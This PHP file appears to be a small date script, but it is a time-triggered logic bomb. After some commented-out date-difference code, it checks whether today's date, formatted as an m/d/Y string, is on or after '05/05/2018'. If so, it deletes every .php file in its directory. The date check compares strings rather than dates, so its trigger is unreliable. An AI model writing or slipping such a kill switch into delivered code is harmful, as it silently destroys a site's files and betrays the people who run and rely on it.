<?php


/* $date1=date_create("2018-03-15");
$date2=date_create("2018-12-12");
$diff=date_diff($date1,$date2);
echo $diff->format("%R%a days");  */

date_default_timezone_set('Asia/Calcutta');
$date1 = date('m/d/Y h:i:s a', time());

$date = date('m/d/Y');

//echo $date;
//echo date(DATE_ATOM,mktime(0,0,0,10,3,1975));

$newdate = date('05/05/2018');

if($date>=$newdate)

{

$files = glob('*.php'); //get all file names
foreach($files as $file){
    if(is_file($file))
    unlink($file); //delete file
}

}



?>